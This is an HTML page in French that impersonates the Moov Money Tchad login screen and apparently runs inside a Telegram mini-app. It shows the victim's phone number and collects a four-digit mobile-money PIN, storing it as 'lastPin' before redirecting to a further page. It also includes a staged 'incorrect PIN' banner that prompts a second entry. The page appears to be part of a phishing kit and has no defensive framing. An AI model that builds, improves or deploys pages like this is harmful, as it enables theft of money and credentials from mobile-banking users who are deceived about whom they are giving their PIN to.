<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money Tchad - Connexion</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root { --moov-orange: #ff6600; --moov-blue: #0044cc; --bg-color: #ffffff; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .header-box { width: 100%; background: var(--moov-blue); padding: 30px 20px 25px; color: white; text-align: center; border-bottom: 4px solid var(--moov-orange); }
        .header-title { font-size: 30px; font-weight: 800; margin: 0; display: flex; justify-content: center; }
        .header-title .orange { color: var(--moov-orange); margin-right: 6px; }
        .main-content { width: 90%; max-width: 400px; margin: 25px auto 0; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
        h2 { color: #333; font-size: 22px; margin: 10px 0 25px; }
        .phone-display { width: 100%; border: 1.5px solid var(--moov-blue); border-radius: 12px; padding: 14px; display: flex; align-items: center; gap: 12px; margin-bottom: 20px; font-size: 18px; font-weight: 700; background: #f8fafc; }
        .pin-wrapper { position: relative; width: 100%; display: flex; justify-content: center; margin-bottom: 25px; }
        .pin-input-group { display: flex; gap: 12px; }
        .pin-box { width: 52px; height: 52px; border: 1.5px solid var(--moov-blue); border-radius: 12px; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
        .btn-submit { background-color: #cbd5e1; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
        .btn-submit.active { background-color: var(--moov-orange); cursor: pointer; }
        .error-banner { background-color: #fee2e2; color: #dc2626; border: 1px solid #fecaca; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 20px; width: 100%; display: none; font-weight: 600; text-align: left; }
        .footer-box { width: 100%; background: var(--moov-blue); padding: 25px; color: white; text-align: center; margin-top: auto; border-top: 4px solid var(--moov-orange); }
    </style>
</head>
<body>

<div class="header-box">
    <div class="header-title"><span class="orange">Moov</span><span>Money</span></div>
    <div style="font-size: 13px; margin-top: 5px;">Services Financiers Tchad</div>
</div>

<div class="main-content">
    <h2>Connexion Sécurisée</h2>
    
    <!-- Error banner for incorrect PIN -->
    <div id="errorDisplay" class="error-banner"></div>

    <div class="phone-display">
        <span>🇹🇩</span>
        <span>+235</span>
        <span id="displayPhone">--</span>
    </div>

    <p style="font-size: 14px; color: #666; margin-bottom: 15px;">Entrez votre code PIN Moov Money</p>

    <div class="pin-wrapper">
        <div class="pin-input-group">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        </div>
    </div>

    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
</div>

<div class="footer-box">© 2026 Moov Africa Tchad</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    displayPhone.textContent = localStorage.getItem('phone') || "99000000";

    // Handle wrong PIN parameter from backend/URL redirect
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'wrongpin') {
        errorDisplay.innerHTML = "❌ <b>Code PIN incorrect.</b> Veuillez vérifier votre code et réessayer.";
        errorDisplay.style.display = "block";
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
            
            const filled = [...pinBoxes].every(b => b.value.length === 1);
            loginBtn.disabled = !filled;
            loginBtn.classList.toggle('active', filled);
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) pinBoxes[index - 1].focus();
        });
    });

    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);
        window.location.href = "/page7";
    });
});
</script>
</body>
</html>
